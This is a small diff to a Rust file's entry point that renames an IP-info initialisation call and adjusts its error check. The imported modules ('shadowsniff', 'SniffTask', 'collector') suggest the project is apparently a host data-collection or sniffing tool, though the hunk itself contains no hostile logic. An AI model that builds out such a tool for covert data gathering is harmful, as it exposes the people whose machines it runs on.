@@ -30,14 +30,14 @@ use collector::display::PrimitiveDisplayCollector;
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
 use filesystem::{FileSystem, FileSystemExt};
-use ipinfo::init_ip_info;
+use ipinfo::init;
 use shadowsniff::SniffTask;
 use tasks::Task;
 use utils::log_debug;
 
 #[inline(always)]
 pub fn run() {
-    if !init_ip_info() {
+    if init().is_none() {
         panic!()
     }
 
